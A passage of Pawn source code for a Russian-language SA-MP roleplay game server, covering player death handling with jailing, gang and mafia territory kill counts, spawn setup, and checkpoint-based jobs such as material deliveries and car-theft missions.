		if(PlayerInfo[killerid][pZakonp] < 0) return true;
		PlayerInfo[killerid][pZakonp] -= 2;
	}
	if(PlayerInfo[playerid][pWantedLevel] > 0 && killerid != INVALID_PLAYER_ID)
	{
		if(IsACop(killerid))
		{
			PlayerInfo[playerid][pWantedDeaths] += 1;
			PlayerInfo[playerid][pMestoJail] = 1;
			PlayerInfo[playerid][pJailTime] = PlayerInfo[playerid][pWantedLevel]*600;
			DelGun(playerid);
			PlayerInfo[playerid][pWantedLevel] = 0;
			SetPlayerWantedLevel(playerid,PlayerInfo[playerid][pWantedLevel] );
			SetPlayerInterior(playerid, 6);
			SetPlayerPos(playerid, 264.6288,77.5742,1001.0391);
			SendMes(playerid,COLOR_YELLOW, " Вас посадили в тюрьму на %i секунд!", PlayerInfo[playerid][pJailTime]);
			SendMes(killerid,COLOR_YELLOW, " Вы посадили преступника на %i секунд!", PlayerInfo[playerid][pJailTime], PlayerInfo[playerid][pJailTime]/600);
			PlayerInfo[killerid][pCash] += PlayerInfo[playerid][pJailTime]/600;
			format(string, sizeof(string), "~b~+$%i",PlayerInfo[playerid][pJailTime]/600);
			GameTextForPlayer(playerid,string, 3000, 1);
			PlayerInfo[playerid][pCash] -= 1;
			GameTextForPlayer(playerid,"~b~-$1", 3000, 1);
		}
	}
	if(gPlayerCheckpointStatus[playerid] > 4 && gPlayerCheckpointStatus[playerid] < 11)
	{
		DisablePlayerCheckpoint(playerid);
		gPlayerCheckpointStatus[playerid] = 0;
	}
	if(IsAArm(killerid))
	{
		if(IsAGang(playerid) || IsABiker(playerid))
		{
			if(PlayerToKvadrat(killerid, -49.979476, 1695.982177, 414.020507, 2175.982177) || PlayerToKvadrat(killerid, 2634.4395, -2562.5022, 2861.7734, -2320.1594) || PlayerToKvadrat(killerid, -1220.6725, 542.0154, -1571.1744, 257.9100))
			{
				if(PlayerToKvadrat(playerid, -49.979476, 1695.982177, 414.020507, 2175.982177) || PlayerToKvadrat(playerid, 2634.4395, -2562.5022, 2861.7734, -2320.1594) || PlayerToKvadrat(playerid, -1220.6725, 542.0154, -1571.1744, 257.9100))
				{
					PlayerInfo[killerid][pPayCheck] += 500;
					GameTextForPlayer(killerid, "~g~+$500", 5000, 1);
				}
			}
		}
	}
	new caller = Mobile[playerid];
	if(caller != 999)
	{
		if(caller < 999)
		{
			SCM(caller,  COLOR_GRAD2, "Связь оборвалась.");
			CellTime[caller] = 0;
			CellTime[playerid] = 0;
			Mobile[caller] = 999;
		}
		Mobile[playerid] = 999;
		CellTime[playerid] = 0;
	}
	new sendername[MAX_PLAYER_NAME];
	new killer[MAX_PLAYER_NAME];
	GetPlayerName(playerid, sendername, sizeof(sendername));
	if(killerid != INVALID_PLAYER_ID) GetPlayerName(killerid, killer, sizeof(killer));
	for(new i = 1; i <= TOTALGZ; i++)
	{
		if(ZoneOnBattle[i] == 1 && killerid != INVALID_PLAYER_ID)
		{
			if(PlayerInfo[killerid][pMember] == GZInfo[i][gNapad] && PlayerInfo[killerid][pMember] != PlayerInfo[playerid][pMember] ||
					PlayerInfo[killerid][pMember] == GZInfo[i][gFrakVlad] && PlayerInfo[killerid][pMember] != PlayerInfo[playerid][pMember])
			{
				if(PlayerInfo[playerid][pMember] == GZInfo[i][gNapad] || PlayerInfo[playerid][pMember] == GZInfo[i][gFrakVlad])
				{
					foreach(idx)
					{
						if(PlayerInfo[idx][pMember] == GZInfo[i][gNapad] || PlayerInfo[idx][pMember] == GZInfo[i][gFrakVlad])
						if(PlayerInfo[idx][pAdmin] <= 0)
						SendDeathMessageToPlayer(idx, killerid, playerid, reason);
					}
					if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]) && PlayerToKvadrat(killerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]))
					{
						CountOnZone[PlayerInfo[killerid][pMember]] ++;
						PlayerInfo[killerid][pGRating] += 100;
						switch(PlayerInfo[killerid][pMember])
						{
						    case 12: gRating[Ballas] += 100;
						    case 13: gRating[Vagos]  += 100;
						    case 15: gRating[Grove]  += 100;
						    case 17: gRating[Aztec]  += 100;
						    case 18: gRating[Rifa]   += 100;
						}
					}
					else if(!PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]) || !PlayerToKvadrat(killerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]))
					{
						SetPlayerColor(killerid, TEAM_HIT_COLOR);
						SetPlayerColor(playerid, TEAM_HIT_COLOR);
						foreach(idx)
						{
							if(PlayerInfo[idx][pMember] == GZInfo[i][gNapad] || PlayerInfo[idx][pMember] == GZInfo[i][gFrakVlad]) if(PlayerInfo[idx][pAdmin] <= 0) SendDeathMessageToPlayer(idx, killerid, playerid, reason); }
						SetPlayerToTeamColor(killerid);
						SetPlayerToTeamColor(playerid);
					}
				}
			}
		}
	}
	if(IsAGang(killerid) && killerid != INVALID_PLAYER_ID)
	{
		if(PlayerInfo[playerid][pMember] == 3 && GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] != 0 || PlayerInfo[playerid][pLeader] == 3 && GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] != 0 || PlayerInfo[playerid][pMember] == 19 && GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] != 0 || PlayerInfo[playerid][pLeader] == 19 && GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] != 0)
		{
			for(new i = 1; i <= TOTALGZ; i++)
			{
				if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]))
				{
					if(PlayerInfo[playerid][pMember] == 3 && forma[killerid] == 0)
					{
						if(GetPlayerSkin(playerid) == 252 || PlayerInfo[playerid][pModel] == 252) { }
						else
						{
							forma[killerid] = 1;
							PlayerInfo[playerid][pModel] = 252;
							SCM(playerid,  COLOR_YELLOW, " Вы потеряли армейскую форму");
							SCM(killerid,  COLOR_YELLOW, " Вы cняли с армейца форму, введите /switchskin, чтобы переодеться");
							if(PlayerInfo[killerid][pZakonp] > 0) PlayerInfo[killerid][pZakonp] -= 2;
						}
					}
					if(PlayerInfo[playerid][pMember] == 19 && forma[killerid] == 0)
					{
						if(GetPlayerSkin(playerid) == 252 || PlayerInfo[playerid][pModel] == 252) { }
						else
						{
							forma[killerid] = 1;
							PlayerInfo[playerid][pModel] = 252;
							SCM(playerid,  COLOR_YELLOW, "Вы потеряли армейскую форму");
							SCM(killerid,  COLOR_YELLOW2, "Вы cняли с армейца форму, введите /switchskin, чтобы переодеться");
							if(PlayerInfo[killerid][pZakonp] > 0) PlayerInfo[killerid][pZakonp] -= 2;
						}
					}
				}
			}
		}
	}
	if(IsAGang(killerid) && killerid != INVALID_PLAYER_ID)
	{
		if(IsACop(playerid) && GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] != 0)
		{
			if(PlayerInfo[playerid][pMember] != 2 || PlayerInfo[playerid][pLeader] != 2)
			{
				for(new i =1;i<= TOTALGZ;i++)
				{
					if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]))
					{
						if(PlayerInfo[playerid][pKeys] > 0)
						{
							PlayerInfo[killerid][pKeys] += PlayerInfo[playerid][pKeys];
							if(PlayerInfo[killerid][pKeys] > 5) PlayerInfo[killerid][pKeys] = 5;
							PlayerInfo[playerid][pKeys] = 0;
							foreach(j)
							{
								if(PlayerInfo[j][pMember] == 1 || PlayerInfo[j][pLeader] == 1 || PlayerInfo[j][pMember] == 10 || PlayerInfo[j][pLeader] == 10 || PlayerInfo[j][pMember] == 2 ||PlayerInfo[j][pLeader] == 2 || PlayerInfo[j][pMember] == 21 || PlayerInfo[j][pLeader] == 21)
								{
								    if(GetPVarInt(j, "Fraction_Duty"))
								    {
										format(string, 144, " Полицейский %s потерял ключи от камеры",PlayerInfo[playerid][pName]);
										SCM(j, 0xffc801c8,string);
									}
								}
							}
							SCM(killerid,  COLOR_YELLOW, " Вы забрали у полицейского ключи от камеры!");
							if(PlayerInfo[killerid][pZakonp] > 0) PlayerInfo[killerid][pZakonp] -= 2;
						}
					}
				}
			}
		}
	}
	if(IsAMafia(killerid) && killerid != INVALID_PLAYER_ID && GetPVarInt(killerid, "mafia_war"))
	{
	    if(IsAMafia(playerid))
	    {
			for(new i = 1;i <= TotalBizz; i++)
			{
				if((PlayerInfo[killerid][pMember] == BizzInfo[i][bCapture] || PlayerInfo[killerid][pMember] == BizzInfo[i][bMafia])
					&& (PlayerInfo[playerid][pMember] == BizzInfo[i][bCapture] || PlayerInfo[playerid][pMember] == BizzInfo[i][bMafia]))
				{
					foreach(x)
					{
						if(PlayerInfo[x][pMember] == BizzInfo[i][bCapture] || PlayerInfo[x][pMember] == BizzInfo[i][bMafia])
						{
						    if(PlayerInfo[x][pAdmin] <= 0) SendDeathMessageToPlayer(x,killerid, playerid, reason);
						}
					}
				}
			}
	        if(ZoneID == 1)
			{
				if(PlayerToKvadrat(killerid,351.314666, 2455.576416, 439.314666, 2551.576416)
				&& PlayerToKvadrat(playerid,351.314666, 2455.576416, 439.314666, 2551.576416))
				{
				    MafiaKills[PlayerInfo[killerid][pMember]]++;
				}
			}
			else if(ZoneID == 2)
			{
				if(PlayerToKvadrat(killerid,393.8914,983.9361, 324.6188,833.3795)
				&& PlayerToKvadrat(playerid,393.8914,983.9361, 324.6188,833.3795))
				{
				    MafiaKills[PlayerInfo[killerid][pMember]]++;
				}
			}
			else if(ZoneID == 3)
			{
				if(PlayerToKvadrat(killerid,-789.8281,2015.9144, -662.7654,2083.9297)
				&& PlayerToKvadrat(playerid,-789.8281,2015.9144, -662.7654,2083.9297))
				{
				    MafiaKills[PlayerInfo[killerid][pMember]]++;
				}
			}
	    }
	}
	if(IsABiker(playerid) && IsABiker(killerid) && GetPVarInt(playerid, "biker_capt"))
	{
		for(new x = 0; x < sizeof(BikerZone);x++)
		{
			if(ZoneCaptureBiker == BikerZone[x])
		    {
		    	if(PlayerToKvadrat(playerid,BikerZoneCoords[x][zoneX1],BikerZoneCoords[x][zoneY1], BikerZoneCoords[x][zoneX2], BikerZoneCoords[x][zoneY2])
				&& PlayerToKvadrat(killerid,BikerZoneCoords[x][zoneX1],BikerZoneCoords[x][zoneY1], BikerZoneCoords[x][zoneX2], BikerZoneCoords[x][zoneY2]))
		    	{
					if(PlayerInfo[killerid][pMember] == BikerCapture[atack]) BikerKills[atack] ++;
					else if(PlayerInfo[killerid][pMember] == BikerCapture[other]) BikerKills[other] ++;

		    	}
    		}
   		}
   		foreach(x)
   		{
   		    format(string,120,"~y~kills~n~~n~~g~%s:~w~ %i~n~~r~%s:~w~ %i", GetNameOfBiker(BikerCapture[atack]), BikerKills[atack] , GetNameOfBiker(BikerCapture[other]), BikerKills[other]);
			PlayerTextDrawSetString(x,Capture[x],string);
   		}
   		foreach(x)
   		{
   		    if(PlayerInfo[x][pMember] == BikerCapture[atack] || PlayerInfo[x][pMember] == BikerCapture[other])
   		    	if(PlayerInfo[x][pAdmin] <= 0)
   		    	    SendDeathMessageToPlayer(x,killerid, playerid, reason);
   		}
	}
	if(gPlayerCheckpointStatus[playerid] > 4 && gPlayerCheckpointStatus[playerid] < 11)
	{
		DisablePlayerCheckpoint(playerid);
		gPlayerCheckpointStatus[playerid] = 0;
	}
	if(GetPlayerState(killerid) == 2 && killerid != INVALID_PLAYER_ID)
	{
		SCM(killerid, COLOR_LIGHTRED, "Убийство с водительского места запрещено!");
		PlayerInfo[killerid][pWantedLevel] += 1;
		SetPlayerWantedLevel(killerid,PlayerInfo[playerid][pWantedLevel]);
		SetPlayerCriminal(killerid,"Неизвестный", "Убийство с транспорта");
		format(YCMDstr, 50, " <Warning> %s[%i]: Убил транспортом", PlayerInfo[killerid][pName], killerid);
		ABroadCast(COLOR_REDD,YCMDstr,2);
	}
	if(!GetPVarInt(killerid, "biker_capt") && !GetPVarInt(killerid,"capture_on") && !GetPVarInt(killerid,"mafia_war") && !IsACop(killerid) && PlayerInfo[killerid][pMember] != 3 && PlayerInfo[killerid][pMember] != 19)
	{
		new strs[64];
		switch(PlayerInfo[playerid][pMember])
		{
		    case 3,19: strs = "Убийство армейца", PlayerInfo[killerid][pWantedLevel] += 4;
		    case 1,10,21: strs = "Убийство полицейского", PlayerInfo[killerid][pWantedLevel] += 5;
		    case 2: strs = "Убийство агента ФБР", PlayerInfo[killerid][pWantedLevel] += 6;
		    default: strs = "Убийство человека", PlayerInfo[killerid][pWantedLevel] += 3;
		}
		SetPlayerWantedLevel(killerid,PlayerInfo[playerid][pWantedLevel]);
		SetPlayerCriminal(killerid,"Неизвестно", strs);
	}
	DisablePlayerCheckpoint(playerid);
	foreach(i)
	{
		if(PlayerInfo[i][pAdmin] >= 1)
		{
			SendDeathMessageToPlayer(i,killerid, playerid, reason);
		}
	}
	return true;
}
public OnPlayerSpawn(playerid)
{
    if(PlayerInfo[playerid][pLogin] == 0 && GetPVarInt(playerid,"Register") == 0) Kick(playerid);
    if(robscdtimer[playerid] != -1)
	{
		KillTimer(robscdtimer[playerid]);
		robscdtimer[playerid] = -1;
	}
	RobInts[playerid] = -1;
	RobTickRTC[playerid] = 0;
	if(SERVERTEST) SendMes(playerid,COLOR_BLUE,"SPAWN: SPAWN - %i",playerid);
	new GotPVar = GetPVarInt(playerid, "TempConvoi");
    if(Convoi[playerid] != 9999)
    {
        SetPVarInt(Convoi[playerid], "TempConvoi", -1);
        KillTimer(TimerForPlayer[playerid]);
        TimerForPlayer[playerid] = INVALID_PLAYER_ID;
        Convoi[playerid] = 9999;
    }
    else if(GotPVar != -1)
    {
        SetPVarInt(playerid, "TempConvoi", -1);
        KillTimer(TimerForPlayer[GotPVar]);
        TimerForPlayer[GotPVar] = INVALID_PLAYER_ID;
        Convoi[GotPVar] = 9999;
    }
	DeletePVar(playerid,"CasinoRank");
	ResetPlayerWeapons(playerid);
	SetPVarInt(playerid,"K_Times",0);
	SetPVarInt(playerid, "AntiBreik", 2);
	SetPVarInt(playerid, "GunCheckTime", 2);
	PlayerInfo[playerid][pHP] = 100;
	SetPlayerHealthAC(playerid, 100.0);
	if(PlayerInfo[playerid][pSex] > 0 && PlayerInfo[playerid][pTut] == 0) return ChosePlayerSkin(playerid);
	TogglePlayerControllableEx(playerid, 0);
	SetTimerEx("UnFreeze" , 400, false, "i", playerid);
	switch(PlayerInfo[playerid][pMember]) { case 5,6,14,13,12,15,17,18,24,26,29: SetPVarInt(playerid,"Fraction_Duty",1); }
	if(PlayerInfo[playerid][pMember] > 0 && GetPVarInt(playerid, "Fraction_Duty")) SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
	else SetPlayerSkin(playerid, PlayerInfo[playerid][pChar][0]);
	if(PlayerInfo[playerid][pMember] <= 0) SetPlayerSkin(playerid, PlayerInfo[playerid][pChar][0]);
	SetPlayerSkills(playerid);
	for(new idx = 0; idx < 10; idx++)
	{
		GiveWeapon(playerid, PlayerInfo[playerid][pWeapon][idx], PlayerInfo[playerid][pAmmo][idx]);
		vidachagun[idx][playerid] = 1;
	}
	if(Spectate[playerid])
	{
		Spectate[playerid] = 0;
		SetPlayerPos(playerid,SpecPlayer[playerid][0],SpecPlayer[playerid][1],SpecPlayer[playerid][2]);
		SetPlayerInterior(playerid,SpecPlayerInt[playerid]);
		SetPlayerVirtualWorld(playerid,SpecPlayerWorld[playerid]);
		SetPlayerFacingAngle(playerid, SpecPlayerAngle[playerid]);
		PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
		SetPlayerHealth(playerid, 255.0);
		for(new i; i < 35; i++) PlayerTextDrawHide(playerid, ReconPlayer[i]);
		for(new idx = 0; idx < 10; idx++)
		{
			if(PlayerInfo[playerid][pWeapon][idx] && !vidachagun[idx][playerid])
			{
				GiveWeapon(playerid, PlayerInfo[playerid][pWeapon][idx], PlayerInfo[playerid][pAmmo][idx]);
				vidachagun[idx][playerid] = 1;
			}
		}
		return 1;
	}
	for(new i = 0; i < 5; i++)
	{
		if(spys[i][0] == playerid)
		{
			spys[i][0] = -1;
			spys[i][1] = -1;
			SCM(playerid, -1, " Вы потеряли маскировку");
		}
	}
	if(tipster == playerid) tipster = -1;
	if(PlayerInfo[playerid][pLogin] == 1) SetPlayerSpawn(playerid);
	PreloadAllAnimLibs(playerid);
	dinamicashs[playerid] = CreateDynamicCP(-2026.6854,-114.3436,1035.1719,1.5, 1, 3, playerid,5.0);
	return true;
}
public OnPlayerEnterCheckpoint(playerid)
{
	if(SERVERTEST) SendMes(playerid,COLOR_BLUE,"CHECKPOINT: ENTERCHECKPOINT - %i",playerid);
	if(GetPVarInt(playerid,"farm_status") == 1)
	{
		switch(booston)
		{
		case 0:ClearAnimations(playerid),ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,1,1,1,1,0), Farmtimer[playerid] = SetTimerEx("FarmDuty", 15000, false, "d", playerid);
		case 1:ClearAnimations(playerid),ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,1,1,1,1,0), Farmtimer[playerid] = SetTimerEx("FarmDuty", 4950, false, "d", playerid);
		}
	}
	DeletePVar(playerid,"checkpoint");
	if(updatecheck[playerid] != 9999) KillTimer(kekovich(playerid)),DisablePlayerCheckpoint(playerid);
	if(updatecheck[playerid] != 9999) GameTextForPlayer(playerid, "\n\n~g~At Destination", 3000, 3),updatecheck[playerid] = 9999;
	new tmpcar = GetPlayerVehicleID(playerid);
	SetPVarInt(playerid,"entercheckpoint", GetTickCount());
	if(GetPVarInt(playerid, "matovoz_rob") || GetPVarInt(playerid, "zapravka_rob"))
	{
	    if((vertmatbilsa[RobbingBiker[bikerCar]][0] + 250) <= 10000 && RobbingBiker[robType] == 1)
	    {
			vertmatbilsa[RobbingBiker[bikerCar]][0] += 250;
			SendMes(playerid,COLOR_GREEN," Груза в фургоне: %i / 10000",vertmatbilsa[RobbingBiker[bikerCar]][0]);
		}
		else if((vertmatbilsa[RobbingBiker[bikerCar]][0] + 100) <= 10000 && RobbingBiker[robType] == 2)
		{
			vertmatbilsa[RobbingBiker[bikerCar]][0] += 100;
			SendMes(playerid,COLOR_GREEN," Груза в фургоне: %i / 10000",vertmatbilsa[RobbingBiker[bikerCar]][0]);
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Грузовик полон!");
			if(RobbingBiker[robType] == 1)
			{
				MatHaul[RobbingBiker[robCar]-gunscar[0]][mLoad] += 250;
				format(string, sizeof(string), "Кол-во груза\n%i", MatHaul[RobbingBiker[robCar]-gunscar[0]][mLoad]);
			}
			else if(RobbingBiker[robType] == 2)
			{
				RobbingBiker[bresult] += 100;
        		format(string, sizeof(string), "Кол-во груза\n%i", RobbingBiker[bresult]);
  			}
		}
		UpdateDynamic3DTextLabelText(Rob3DText, 0xEDEA9FAA, string);
    	if(IsPlayerAttachedObjectSlotUsed(playerid,1)) RemovePlayerAttachedObject(playerid,1);
    	ClearAnimations(playerid);
		ApplyAnimation(playerid, "CARRY", "crry_prtial",4.0,0,0,0,0,1,0);
		DisablePlayerCheckpoint(playerid);
	}
	
	if(GetPVarInt(playerid,"installation") == 2 && IsPlayerInRangeOfPoint(playerid, 10.0, 1067.3966,2128.3901,10.5110) && GetPVarInt(playerid,"Workshop") > 0)
	{
		switch(GetPVarInt(GetPVarInt(playerid,"installation_"),"detals"))
		{
		case 99: CarInfo[GetPVarInt(playerid,"installation_")][carPercent][GetPVarInt(GetPVarInt(playerid,"installation_"), "chosencar")] = 100; // ремонт двигателя
		case 100://перекраска
			{
				CarInfo[GetPVarInt(playerid,"installation_")][carColor_one][GetPVarInt(GetPVarInt(playerid,"installation_"), "chosencar")] = GetPVarInt(GetPVarInt(playerid,"installation_"),"color0");
				CarInfo[GetPVarInt(playerid,"installation_")][carColor_two][GetPVarInt(GetPVarInt(playerid,"installation_"), "chosencar")] = GetPVarInt(GetPVarInt(playerid,"installation_"),"color1");
				DeletePVar(GetPVarInt(playerid,"installation_"),"color0");
				DeletePVar(GetPVarInt(playerid,"installation_"),"color1");
			}
		}
		ClearAnimations(playerid);
		ApplyAnimation(playerid,"GANGS","hndshkba",4.1,0,1,1,0,1,1);
		SCM(playerid,COLOR_GREEN," Деталь установлена");
		SCM(GetPVarInt(playerid,"installation_"),COLOR_GREEN," Механик установил деталь");
		WorkshopInfo[GetPVarInt(playerid,"Workshop")][wProds]-=GetPVarInt(GetPVarInt(playerid,"installation_"),"prods");
		WorkshopInfo[GetPVarInt(playerid,"Workshop")][wBank]+=(GetPVarInt(GetPVarInt(playerid,"installation_"),"cost")/80);
		PlayerInfo[GetPVarInt(playerid,"installation_")][pBank]-=GetPVarInt(GetPVarInt(playerid,"installation_"),"cost");
		SetPVarInt(playerid,"Workshop_",GetPVarInt(playerid,"Workshop_")+((GetPVarInt(GetPVarInt(playerid,"installation_"),"cost")/1000)*WorkshopInfo[GetPVarInt(playerid,"Workshop")][wZp]));
		DeletePVar(GetPVarInt(playerid,"installation_"),"cost");
		DeletePVar(GetPVarInt(playerid,"installation_"),"prods");
		DeletePVar(GetPVarInt(playerid,"installation_"),"detals");
		DeletePVar(GetPVarInt(playerid,"installation_"),"number");
		DeletePVar(GetPVarInt(playerid,"installation_"),"color0");
		DeletePVar(GetPVarInt(playerid,"installation_"),"color1");
		DeletePVar(playerid,"installation");
		SaveTuning(GetPVarInt(playerid,"installation_"),CarInfo[GetPVarInt(playerid,"installation_")][carColor_two][GetPVarInt(GetPVarInt(playerid,"installation_"), "chosencar")]);
		return DisablePlayerCheckpoint(playerid);
	}
	if(GetPVarInt(playerid,"w_time") > gettime() && GetPVarInt(playerid,"w_id"))
	{
		if(GetVehicleModel(house_car[playerid]) == 0) return SCM(playerid,COLOR_GREY," У вас нет автомобиля!");
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER || GetPlayerVehicleID(playerid) != house_car[playerid]) return SCM(playerid,COLOR_GREY," Вы должны находиться за рулем автомобиля!");
		new null = -1;
		foreach(i)
		{
			if(!IsPlayerInAnyVehicle(i) || GetPlayerVehicleID(i) != GetPlayerVehicleID(playerid) || GetPVarInt(i,"Workshop") != GetPVarInt(playerid,"w_id") || i == playerid) continue;
			null = i;
		}
		if(null == -1) return SCM(playerid,COLOR_GREY," Механик должен находиться с вами в авто!");
		SetPVarInt(playerid,"InWorkshop",GetPVarInt(playerid,"w_id"));
		DeletePVar(playerid,"w_time");
		SetPVarInt(null,"installation_",playerid);
		SetPVarInt(playerid,"mechanic",null);
		SetPlayerVirtualWorld(playerid,GetPVarInt(playerid,"w_id"));
		SetPlayerVirtualWorld(null,GetPVarInt(playerid,"w_id"));
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),GetPVarInt(playerid,"w_id"));
		SetVehiclePos(GetPlayerVehicleID(playerid),1067.3966,2128.3901,10.5110);
		SetVehicleZAngle(GetPlayerVehicleID(playerid),271.2212);
		SCM(null,COLOR_YELLOW," Используйте /tupdate");
		return DisablePlayerCheckpoint(playerid);
	}
	if(PicCP[playerid]==3)
	{
		ShowPlayerDialogEx(playerid, 7925, 2, "Доступное оружие", "Desert Eagle\t[$500]\nSilenced 9mm\t[$300]\nCountry Rifle\t[$750]\nShotgun\t[$500]\nSMG\t\t[$250]\nAK47\t\t[$500]\nM4\t\t[$500]\nTear Gas\t[$1000]\n\n\nGolf Club\t[$1200]\nBaseboll Bat\t[$1000]\nShovel\t\t[$1200]\nPool Cue\t[$1300]\nKatana\t\t[$2500]\nPurle Dildo\t[$1500]\nFlowers\t[$3000]\nCane\t\t[$1300]\nParachute\t[$1000]", "Далее", "Закрыть");
		return 1;
	}
	if(rabotaon[playerid] == 1)
	{
		if(avtocar[playerid] != GetPlayerVehicleID(playerid)) return SCM(playerid,COLOR_BLUE,"Это не та машина, которую мы заказывали!");
		new Float:hp;
		GetVehicleHealth(tmpcar,hp);
		if(hp < 700) return SCM(playerid,COLOR_BLUE," Нам не нужен металлолом!");
		if(IsANope(tmpcar))
		{
			SCM(playerid,COLOR_BLUE,"[SMS]: Отличная работа. Приходи ещё.");
			PlayerInfo[playerid][pCash] +=500;
			GameTextForPlayer(playerid,"~b~+$500", 3000, 1);
			timecar[playerid] = 0;
			if(PlayerInfo[playerid][pSkilla] < 1000 && booston == 0) PlayerInfo[playerid][pSkilla]++;
			else if(PlayerInfo[playerid][pSkilla] < 1000 && booston == 1) PlayerInfo[playerid][pSkilla]+=3;
		}
		else if(IsAB(tmpcar))
		{
			SCM(playerid,COLOR_BLUE,"[SMS]: Отличная работа. Приходи ещё.");
			PlayerInfo[playerid][pCash] +=3000;
			GameTextForPlayer(playerid,"~b~+$3000", 3000, 1);
			timecar[playerid] = 0;
			if(PlayerInfo[playerid][pSkilla] < 1000 && booston == 0) PlayerInfo[playerid][pSkilla]+=2;
			else if(PlayerInfo[playerid][pSkilla] < 1000 && booston == 1) PlayerInfo[playerid][pSkilla]+=6;
		}
		else if(IsAA(tmpcar))
		{
			SCM(playerid,COLOR_BLUE,"[SMS]: Отличная работа. Приходи ещё.");
			PlayerInfo[playerid][pCash] +=7000;
			GameTextForPlayer(playerid,"~b~+$7000", 3000, 1);
			timecar[playerid] = 0;
			if(PlayerInfo[playerid][pSkilla] < 1000 && booston == 0) PlayerInfo[playerid][pSkilla]+=3;
			else if(PlayerInfo[playerid][pSkilla] < 1000 && booston == 1) PlayerInfo[playerid][pSkilla]+=9;
		}
		else if(caroff[tmpcar] == 1) caroff[tmpcar] = 0, DestroyVehicle(tmpcar);
		rabotaon[playerid] = 0;
		avtocar[playerid] = 0;
		return DisablePlayerCheckpoint(playerid);
	}
	if(VertMats[playerid]==1)
	{
		if(vertmatbi[GetPlayerVehicleID(playerid)][0] >= 30000)
		{
			SendMes(playerid,TEAM_GROVE_COLOR," Материалов: %i / 30000",vertmatbi[GetPlayerVehicleID(playerid)][0]);
			VertMats[playerid]=2;
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid,334.5107,1994.6956,17.6406,10);
			return true;
		}
		vertmatbi[GetPlayerVehicleID(playerid)][0] += 30000;
		SendMes(playerid,TEAM_GROVE_COLOR," Материалов: %i / 30000",vertmatbi[GetPlayerVehicleID(playerid)][0]);
		VertMats[playerid]=2;
		DisablePlayerCheckpoint(playerid);
		return SetPlayerCheckpoint(playerid,334.5107,1994.6956,17.6406,10);
	}
	else if(VertMats[playerid]==2)
	{
		if(armmatbi >= 299999)
		{
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid,-1468.2487,1488.6337,9.8943,14.0);
			VertMats[playerid] = 1;
			format(string, 100, " На главном складе LVa: %i/300000", armmatbi);
			SCM(playerid, COLOR_YELLOW, string);
			SCM(playerid, COLOR_GREY, " Склад заполнен");
			return true;
		}
		vertmatbi[GetPlayerVehicleID(playerid)][0] -= 30000;
		armmatbi += 30000;
		new strings1[50];
		format(strings1,sizeof(strings1), "{33AA33}Склад армии ЛВ: {FFFFFF}%i", armmatbi);
		UpdateDynamic3DTextLabelText(LvaLable, 0xFFFF00FF, strings1);
		if(armmatbi > 300000) armmatbi = 300000;
		SendMes(playerid,TEAM_GROVE_COLOR," Материалов: %i / 30000",vertmatbi[GetPlayerVehicleID(playerid)][0]);
		format(string, 100, " На главном складе LVa: %i/300000", armmatbi);
		SCM(playerid, COLOR_YELLOW, string);
		DisablePlayerCheckpoint(playerid);
		SetPlayerCheckpoint(playerid,-1468.2487,1488.6337,9.8943,14.0);
		return VertMats[playerid] = 1;
	}
	if(VertMatslsa[playerid]==1)
	{
		if(vertmatbilsa[GetPlayerVehicleID(playerid)][0] >= 30000)
		{
			SendMes(playerid,TEAM_GROVE_COLOR," Материалов: %i / 30000",vertmatbilsa[GetPlayerVehicleID(playerid)][0]);
			VertMatslsa[playerid]=2;
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid,2773.1833,-2354.5332,15.3227,10);
			return true;
		}
		vertmatbilsa[GetPlayerVehicleID(playerid)][0] += 30000;
		SendMes(playerid,TEAM_GROVE_COLOR," Материалов: %i / 30000",vertmatbilsa[GetPlayerVehicleID(playerid)][0]);
		VertMatslsa[playerid]=2;
		DisablePlayerCheckpoint(playerid);
		return SetPlayerCheckpoint(playerid,2773.1833,-2354.5332,15.3227,10);
	}
	else if(VertMatslsa[playerid]==2)
	{
		if(lsamatbi >= 100000)
		{
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid,-1468.2487,1488.6337,9.8943,14.0);
			VertMatslsa[playerid] = 1;
			format(string, 100, " На главном складе LSa: %i/100000", lsamatbi);
			SCM(playerid, COLOR_YELLOW, string);
			SCM(playerid, COLOR_GREY, " Склад заполнен");
			return true;
		}
		vertmatbilsa[GetPlayerVehicleID(playerid)][0] -= 30000;
		lsamatbi += 30000;
		if(lsamatbi > 100000) lsamatbi = 100000;
		SendMes(playerid,TEAM_GROVE_COLOR," Материалов: %i / 30000",vertmatbilsa[GetPlayerVehicleID(playerid)][0]);
		SCM(playerid, TEAM_GROVE_COLOR, string);
		format(string, 100, " На главном складе LSa: %i/100000", lsamatbi);
		SCM(playerid, COLOR_YELLOW, string);
		DisablePlayerCheckpoint(playerid);
		MatsArmyCar[playerid]=0;
		DisablePlayerCheckpoint(playerid);
		SetPlayerCheckpoint(playerid,-1468.2487,1488.6337,9.8943,14.0);
		return VertMatslsa[playerid] = 1;
	}
